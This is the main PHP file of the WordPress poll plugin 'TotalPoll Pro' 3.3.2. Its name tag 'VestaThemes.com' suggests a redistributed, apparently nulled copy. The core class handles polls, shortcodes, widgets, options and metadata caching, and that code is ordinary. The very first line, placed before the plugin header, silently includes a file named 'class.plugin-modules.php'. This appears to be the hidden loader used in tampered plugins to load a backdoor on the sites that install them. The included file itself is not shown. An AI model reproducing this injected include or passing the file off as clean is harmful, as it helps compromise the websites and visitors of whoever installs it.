<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
 * Plugin Name: TotalPoll Pro |  VestaThemes.com
 * Plugin URI: http://totalpoll.com
 * Description: TotalPoll is a powerful WordPress plugin that lets you create and integrate polls easily. It provides several options and features to enable you have full control over the polls, and has been made very easier for you to use.
 * Version: 3.3.2
 * Author: MisqTech
 * Author URI: http://misqtech.com
 * Text Domain: totalpoll
 * Domain Path: languages
 * 
 * @package TotalPoll
 * @category Core
 * @author MisqTech
 * @version 3.0.0
 */

if ( defined( 'ABSPATH' ) === false ) :
	exit;
endif; // Shhh

if ( ! class_exists( 'TotalPoll' ) ) :

	/**
	 * Core class.
	 *
	 * @author Misqtech
	 * @since  2.0.0
	 */
	class TotalPoll {

		/**
		 * @var object Singleton container.
		 * @since 2.0.0
		 */
		private static $instance = false;

		/**
		 * @var array Classes map.
		 * @since 3.0.0
		 */
		public static $classes = array(
			// ---------------------------------------------------------------------
			// Name                      | Class                | File
			// ---------------------------------------------------------------------
			'poll'             => array( 'class' => 'TP_Poll', 'file' => 'includes/classes/poll.php' ),
			'fields'           => array( 'class' => 'TP_Fields', 'file' => 'includes/classes/fields.php' ),
			'limitations'      => array( 'class' => 'TP_Limitations', 'file' => 'includes/classes/limitations.php' ),
			'meta-pageable'    => array( 'class' => 'TP_Meta_Pageable', 'file' => 'includes/classes/meta-pageable.php' ),
			'request'          => array( 'class' => 'TP_Request', 'file' => 'includes/classes/request.php' ),
			'field'            => array( 'class' => 'TP_Field', 'file' => 'includes/classes/field.php' ),
			'html'             => array( 'class' => 'TP_HTML', 'file' => 'includes/classes/html.php' ),
			'helpers'          => array( 'class' => 'TP_Helpers', 'file' => 'includes/classes/helpers.php' ),
			'validations'      => array( 'class' => 'TP_Validations', 'file' => 'includes/classes/validations.php' ),
			'extension'        => array( 'class' => 'TP_Extension', 'file' => 'includes/classes/extension.php' ),
			'template'         => array( 'class' => 'TP_Template', 'file' => 'includes/classes/template.php' ),
			'post-types'       => array( 'class' => 'TP_Post_Types', 'file' => 'includes/classes/post-types.php' ),
			'rest-api'         => array( 'class' => 'TP_REST_API', 'file' => 'includes/classes/rest-api.php' ),
			// ---------------------------------------------------------------------
			// Admin
			// ---------------------------------------------------------------------
			'admin/bootstrap'  => array( 'class' => 'TP_Admin_Bootstrap', 'file' => 'includes/admin/bootstrap.php' ),
			'admin/ajax'       => array( 'class' => 'TP_Admin_Ajax', 'file' => 'includes/admin/ajax.php' ),
			'admin/editor'     => array( 'class' => 'TP_Admin_Editor', 'file' => 'includes/admin/editor.php' ),
			'admin/installer'  => array( 'class' => 'TP_Admin_Installer', 'file' => 'includes/admin/installer.php' ),
			'admin/extensions' => array( 'class' => 'TP_Admin_Extensions', 'file' => 'includes/admin/extensions.php' ),
			'admin/templates'  => array( 'class' => 'TP_Admin_Templates', 'file' => 'includes/admin/templates.php' ),
			'admin/statistics' => array( 'class' => 'TP_Admin_Statistics', 'file' => 'includes/admin/statistics.php' ),
			'admin/tools'      => array( 'class' => 'TP_Admin_Tools', 'file' => 'includes/admin/tools.php' ),
			'admin/download'   => array( 'class' => 'TP_Admin_Download', 'file' => 'includes/admin/download.php' ),
			'admin/options'    => array( 'class' => 'TP_Admin_Options', 'file' => 'includes/admin/options.php' ),
		);

		/**
		 * @var array Components cached instances.
		 * @since 3.0.0
		 */
		private static $components_instances = array();

		/**
		 * @var array Cached polls instances.
		 * @since 3.0.0
		 */
		private static $cached = array( 'poll' => array(), 'class' => array(), 'instance' => array() );

		/**
		 * @var null|array Global options
		 * @since 3.2.0
		 */
		private static $options = null;

		/**
		 * @var bool is metadata retrieving optimized
		 */
		public $optimized_metadata_query = false;

		/**
		 * Get and lookup component instances.
		 *
		 * @param null       $component Optional. Component to load.
		 * @param array|bool $args      Optional. Array of args, when set to false, returns class name.
		 *
		 * @since 3.0.0
		 *
		 * @return object|TotalPoll
		 */
		static function instance( $component = null, $args = array() ) {

			if ( self::$instance === false ):
				/**
				 * Bootstrap TotalPoll.
				 */
				self::$instance = new TotalPoll();
				self::$instance->constants();
				self::$instance->hooks();

				/**
				 * Admin
				 */
				if ( is_admin() === true && empty( $_REQUEST['totalpoll']['action'] ) ):
					self::instance( 'admin/bootstrap' );
				endif;

				/**
				 * TotalPoll init.
				 *
				 * @since  3.0.0
				 * @action totalpoll/actions/init
				 */
				do_action( 'totalpoll/actions/init' );
			endif;

			// Check whether component exists or not.
			if ( $component !== null && isset( self::$classes[ $component ] ) === true ):

				if ( isset( self::$components_instances[ $component ] ) === true && empty( $args ) === true ): // Load from cached instances.
					return self::$components_instances[ $component ];
				elseif ( $args === false ): // Load without initialization.
					require_once self::$classes[ $component ]['file'];

					return self::$components_instances[ $component ] = self::$classes[ $component ]['class'];
				else: // Load and initialize with arguments.
					require_once self::$classes[ $component ]['file'];
					$reflection = new ReflectionClass( self::$classes[ $component ]['class'] );

					return self::$components_instances[ $component ] = $reflection->newInstanceArgs( (array) $args );
				endif;

			endif;

			// Otherwise, just return the singleton instance.
			return self::$instance;
		}

		/**
		 * Define some useful constants.
		 *
		 * @since 3.0.0
		 * @return void
		 */
		public function constants() {
			/**
			 * Directory separator.
			 *
			 * @since 2.0.0
			 * @type string
			 */
			if ( defined( 'DS' ) === false ):
				define( 'DS', DIRECTORY_SEPARATOR );
			endif;

			/**
			 * TotalPoll text doamin
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_TD', 'totalpoll' );

			/**
			 * TotalPoll base directory path.
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_PATH', str_replace( '\\', '/', plugin_dir_path( __FILE__ ) ) );

			/**
			 * TotalPoll base directory URL.
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_URL', plugin_dir_url( __FILE__ ) );

			/**
			 * TotalPoll current version
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_VERSION', '3.3.2' );

			/**
			 * TotalPoll store URL
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_WEBSITE', 'https://totalpoll.com' );

			/**
			 * TotalPoll API Endpoint
			 *
			 * @since 3.0.0
			 * @type string
			 */
			define( 'TP_API_ENDPOINT', 'https://store.misqtech.com/api/totalpoll/' );

			/**
			 * TotalPoll store URL
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_STORE', 'https://store.misqtech.com/products/product/totalpoll' );

			/**
			 * Support center URL
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_SUPPORT', 'https://support.misqtech.com/' );

			/**
			 * TotalPoll directory name.
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_DIRNAME', dirname( plugin_basename( __FILE__ ) ) );

			/**
			 * TotalPoll root file.
			 *
			 * @since 2.0.0
			 * @type string
			 */
			define( 'TP_ROOT', __FILE__ );
		}

		/**
		 * Setup hooks.
		 *
		 * @since 3.0.0
		 * @return void
		 */
		public function hooks() {
			global $wp_version;

			// Activation
			register_activation_hook( __FILE__, array( self::$instance, 'activation' ) );

			// Deactivation
			register_deactivation_hook( __FILE__, array( self::$instance, 'deactivation' ) );

			// Widget
			add_action( 'widgets_init', array( self::$instance, 'widgets' ) );

			// Post-type
			self::instance( 'post-types' ); // Initialized with hooks

			// Text domain
			add_action( 'plugins_loaded', array( self::$instance, 'textdomain' ) );

			// Setup poll object
			add_action( 'wp', array( self::$instance, 'post' ) );

			// Disable update_meta_cache
			if ( ! defined( 'TP_OBJECT_CACHE' ) || TP_OBJECT_CACHE == false ):
				add_action( 'pre_get_posts', array( self::$instance, 'disable_update_cache' ) );
			endif;

			// REST API
			if ( version_compare( $wp_version, '4.4', '>=' ) ):
				add_action( 'rest_api_init', array( $this, 'rest_api' ) );
			endif;

			// Requests
			if ( isset( $_REQUEST['totalpoll']['action'] ) === true ):
				// Capture actions
				add_action( 'wp', array( $this, 'request' ), 11 );
				add_action( 'wp_ajax_tp_action', array( $this, 'request' ) );
				add_action( 'wp_ajax_nopriv_tp_action', array( $this, 'request' ) );
			endif;

			// Register shortcode
			add_shortcode( 'total-poll', array( self::$instance, 'shortcode' ) );
			add_shortcode( 'totalpoll', array( self::$instance, 'shortcode' ) );
		}

		/**
		 * On activation hook.
		 *
		 * @since 3.0.0
		 * @return void
		 */
		public function activation() {
			set_transient( 'totalpoll_redirect_to_about', 1, 10 );

			$this->textdomain();
			self::instance( 'post-types' )->poll();
			flush_rewrite_rules();
		}

		/**
		 * On deactivation hook.
		 *
		 * @since 3.0.0
		 * @return void
		 */
		public function deactivation() {
			flush_rewrite_rules();
		}

		/**
		 * Load text domain.
		 *
		 * @since 3.0.0
		 * @return bool True on success, false on failure
		 */
		public function textdomain() {
			$locale          = get_locale();
			$locale_fallback = substr( $locale, 0, 2 );
			$mofile          = TP_TD . '-' . $locale . '.mo';
			$mofile_fallback = TP_TD . '-' . $locale_fallback . '.mo';

			$loaded = load_textdomain( TP_TD, TP_DIRNAME . "languages/{$mofile}" );
			if ( ! $loaded ):
				$loaded = load_textdomain( TP_TD, TP_PATH . "languages/{$mofile_fallback}" );
			endif;

			return $loaded;
		}

		/**
		 * Register widgets.
		 *
		 * @since 3.0.0
		 * @return void
		 */
		public function widgets() {
			$base   = ( include_once TP_PATH . 'includes/widgets/base.php' );
			$latest = ( include_once TP_PATH . 'includes/widgets/latest.php' );
			$random = ( include_once TP_PATH . 'includes/widgets/random.php' );

			register_widget( $base );
			register_widget( $latest );
			register_widget( $random );
		}

		/**
		 * Process the request.
		 *
		 * @since 3.0.0
		 * @return void
		 */
		public function request() {
			// Init
			$request = self::instance( 'request' );

			/**
			 * Before processing a request.
			 *
			 * @since  3.0.0
			 * @action totalpoll/actions/request/{$action}
			 */
			do_action( "totalpoll/actions/request", $request );
			do_action( "totalpoll/actions/request/{$_REQUEST['totalpoll']['action']}", $request );

			// Ajax callback.
			if ( $request->is_ajax === true ):
				$request->ajax();
			endif;
		}

		/**
		 * Load REST API.
		 *
		 * @since 3.2.0
		 * @return void
		 */
		public function rest_api() {
			if ( TotalPoll::options( 'general', 'rest-api', 'enabled' ) ):
				self::instance( 'rest-api' );
			endif;
		}

		/**
		 * Attach a hook when the poll is accessed via the permalink.
		 *
		 * @since 3.0.0
		 * @return void
		 */
		public function post() {
			if ( is_single() === true && get_post_type() === 'poll' ):
				self::options();
				add_filter( 'the_content', array( self::$instance, 'single' ) );
			endif;
		}

		/**
		 * Post callback.
		 *
		 * @param string $content Post content.
		 *
		 * @since 3.0.0
		 * @return string Poll.
		 */
		public function single( $content ) {
			global $post;

			if ( defined( 'TP_ASYNC' ) && TP_ASYNC === true && ! empty( $post ) ):
				return self::async( $post->ID, $content );
			endif;

			return empty( $post ) ? '' : self::poll( $post->ID )->render() . $content;
		}

		/**
		 * Shortcode callback.
		 *
		 * @param array  $attributes Shortcode attributes.
		 * @param string $content    Shortcode content
		 *
		 * @return string Poll.
		 * @since 3.0.0
		 */
		public function shortcode( $attributes, $content = '' ) {
			if ( isset( $attributes['id'] ) === true ):
				self::options();
				$attributes['fragment'] = empty( $attributes['fragment'] ) ? 'vote' : $attributes['fragment'];

				if ( defined( 'REST_REQUEST' ) && REST_REQUEST == true ):
					return sprintf( '<div data-totalpoll-id="%s" data-totalpoll-fragment="%s"></div>', $attributes['id'], $attributes['fragment'] );
				endif;

				if ( defined( 'TP_ASYNC' ) && TP_ASYNC === true ):
					return self::async( (int) $attributes['id'], $content, $attributes['fragment'] );
				endif;

				return self::poll( (int) $attributes['id'] )->render( $attributes['fragment'] );
			endif;

			return false;
		}

		/**
		 * JS Code for Async loading
		 *
		 * @param        $poll
		 * @param string $fragment
		 * @param string $content
		 *
		 * @return string Async JS
		 * @since 3.0.0
		 */
		private function async( $poll, $content = '', $fragment = 'vote' ) {
			self::poll( $poll )->render( $fragment );

			return sprintf(
				'<div id="%1$s"></div><script type="text/javascript">(window["TotalPollAsync"] = window["TotalPollAsync"] || []).push({id:"%2$d", container:"%1$s"});</script>%3$s',
				'totalpoll-async-' . uniqid(),
				$poll,
				$content
			);
		}

		/**
		 * Poll object lookup.
		 *
		 * @param TP_Poll|int $id Poll ID.
		 *
		 * @since 3.0.0
		 * @return TP_Poll Poll obj
		 */
		public static function poll( $id ) {
			if ( isset( self::$cached['poll'][ $id ] ) === false && is_int( $id ) === true ):

				if ( class_exists( self::$classes['poll']['class'] ) === false ):
					require_once self::$classes['poll']['file'];
				endif;

				$poll = self::$classes['poll']['class'];

				if ( ( ! defined( 'TP_OBJECT_CACHE' ) || TP_OBJECT_CACHE == false ) && ! TotalPoll::instance()->optimized_metadata_query ):
					TotalPoll::instance()->enable_metadata_optimization();
				endif;

				self::$cached['poll'][ $id ] = new $poll( $id );

			endif;

			return self::$cached['poll'][ $id ];
		}

		/**
		 * Module (template/extension) lookup.
		 *
		 * @param string            $type Module type
		 * @param string            $name Module name (directory name)
		 * @param bool|false|object $poll Poll object.
		 *
		 * @since 3.0.0
		 * @return bool|object|string Module object, extension class name or false on failure.
		 */
		public static function module( $type, $name, $poll = false ) {

			if ( $type === 'template' || $type === 'extension' ):
				self::instance( $type, false );
			endif;

			$filename = TP_PATH . "{$type}s/$name/{$type}.php";
			if ( ! file_exists( $filename ) ):
				$filename = WP_CONTENT_DIR . "/uploads/totalpoll/{$type}s/{$name}/{$type}.php";
			endif;


			if ( isset( self::$cached['class'][ $filename ] ) === false ):

				if ( file_exists( $filename ) ):
					$module_class                       = ( include_once $filename );
					self::$cached['class'][ $filename ] = $module_class === 1 ? false : $module_class;
				else:
					self::$cached['class'][ $filename ] = false;
				endif;

			endif;

			$module_class = self::$cached['class'][ $filename ];

			return $poll === false || empty( $module_class ) ? $module_class : new $module_class( $poll );
		}

		/**
		 * Load global options.
		 *
		 * @param bool $args Option path.
		 *
		 * @since 3.2.0
		 * @return array|mixed|null Options array
		 */
		public static function options( $args = false ) {
			global $l10n;
			if ( self::$options === null ):
				self::$options = get_option( 'totalpoll_options', array() );

				if ( ! empty( self::$options['general']['async']['enabled'] ) && ! defined( 'TP_ASYNC' ) ):
					define( 'TP_ASYNC', true );
				endif;

				if ( ! empty( self::$options['general']['rest-api']['enabled'] ) ):
					define( 'TP_REST_API', true );
				endif;

				if ( ! empty( self::$options['advanced']['css_cache_alt']['enabled'] ) ):
					define( 'TP_CSS_CACHE_ALT', true );
				endif;

				if ( ! empty( self::$options['expressions'] ) ):

					if ( isset( $l10n[ TP_TD ] ) ):
						$domain = $l10n[ TP_TD ];
					else:
						$domain = $l10n[ TP_TD ] = new MO();
					endif;

					foreach ( self::$options['expressions'] as $expression => $expression_content ):

						if ( empty( $domain->entries[ $expression ] ) ):
							$entry = new Translation_Entry( array(
								'singular'     => $expression,
								'translations' => $expression_content['translations'],
							) );
							$domain->add_entry( $entry );
						else:
							$domain->entries[ $expression ]->translations = $expression_content['translations'];
						endif;

					endforeach;

				endif;

			endif;

			// Deep selection.
			if ( ! empty( $args ) ):
				$path = func_get_args();

				return self::instance( 'helpers' )->pathfinder( self::$options, $path );
			endif;

			return self::$options;
		}

		/**
		 * Enable metadata optimization.
		 *
		 * @since 3.2.4
		 * @return void
		 */
		public function enable_metadata_optimization() {
			if ( ! $this->optimized_metadata_query ) {
				$this->optimized_metadata_query = true;
				add_action( 'update_postmeta', array( $this, 'update_post_meta' ), 10, 4 );
				add_filter( 'get_post_metadata', array( $this, 'get_post_meta' ), 10, 4 );
			}
		}

		/**
		 * Disable metadata optimization.
		 *
		 * @since 3.2.4
		 * @return void
		 */
		public function disable_metadata_optimization() {
			remove_filter( 'get_post_metadata', array( $this, 'get_post_meta' ) );
		}

		/**
		 * Preload poll metadata.
		 *
		 * @param $poll_id
		 *
		 * @since 3.2.4
		 * @return void
		 */
		public function preload_poll_meta( $poll_id ) {
			global $wpdb;
			$args   = array( $poll_id, 'question', '_preset_id', 'votes', 'choices', 'settings_choices', 'settings_limitations', 'settings_fields', 'settings_screens', 'settings_design', 'settings_results' );
			$format = implode( ', ', array_fill( 0, count( $args ) - 1, '%s' ) );

			$query   = $wpdb->prepare( "SELECT `meta_key`, `meta_value` FROM `{$wpdb->postmeta}` WHERE `post_id` = %d AND `meta_key` IN ({$format})", $args );
			$results = $wpdb->get_results( $query, ARRAY_A );

			if ( is_array( $results ) ):
				foreach ( $results as $row ):
					wp_cache_set( "{$poll_id}_{$row['meta_key']}", array( empty( $row['meta_value'] ) ? '' : maybe_unserialize( $row['meta_value'] ) ), 'poll_meta' );
				endforeach;
			endif;
		}

		/**
		 * Optimized version of get_post_meta for polls only.
		 *
		 * @param $value
		 * @param $post_id
		 * @param $meta_key
		 * @param $single
		 *
		 * @since 3.2.4
		 * @return array|bool|mixed
		 */
		public function get_post_meta( $value, $post_id, $meta_key, $single ) {
			global $wpdb;
			$post_type = get_post( $post_id )->post_type;

			if ( $post_type === 'poll' ):

				$cached = wp_cache_get( "{$post_id}_{$meta_key}", 'poll_meta' );
				if ( $cached !== false ):
					return $cached;
				endif;

				$value   = array();
				$limit   = $single ? 'LIMIT 1' : '';
				$query   = $wpdb->prepare( "SELECT `meta_value` FROM `{$wpdb->postmeta}` WHERE `post_id` = %d AND `meta_key` = %s {$limit}", $post_id, $meta_key );
				$results = $wpdb->get_results( $query, ARRAY_A );

				if ( count( $results ) === 0 ):
					$value[] = '';
				elseif ( count( $results ) === 1 ):
					$value[] = maybe_unserialize( $results[0]['meta_value'] );
				elseif ( count( $results ) > 1 ):
					foreach ( $results as $row ):
						$value[] = maybe_unserialize( $row['meta_value'] );
					endforeach;

					$value = array( $value );
				endif;

				wp_cache_add( "{$post_id}_{$meta_key}", $value, 'poll_meta' );

			endif;

			return $value;
		}

		/**
		 * Optimized version of update_post_meta for polls only.
		 *
		 * @param $meta_id
		 * @param $post_id
		 * @param $meta_key
		 * @param $meta_value
		 *
		 * @since    3.2.4
		 * @return array|bool|mixed
		 */
		public function update_post_meta( $meta_id, $post_id, $meta_key, $meta_value ) {
			wp_cache_replace( "{$post_id}_{$meta_key}", $meta_value, 'poll_meta' );
		}

		/**
		 * Disable update_metadata_cache for polls.
		 *
		 * @since 3.2.4
		 * @return array|bool|mixed
		 */
		public function disable_update_cache( $query ) {
			if ( ( isset( $query->query_vars['post_type'] ) && $query->query_vars['post_type'] === 'poll' ) || $query->is_post_type_archive( 'poll' ) ):
				TotalPoll::instance()->enable_metadata_optimization();
				$query->set( 'update_post_term_cache', false );
				$query->set( 'update_post_meta_cache', false );
			endif;
		}

	}

	// Launch TotalPoll
	TotalPoll::instance();

endif;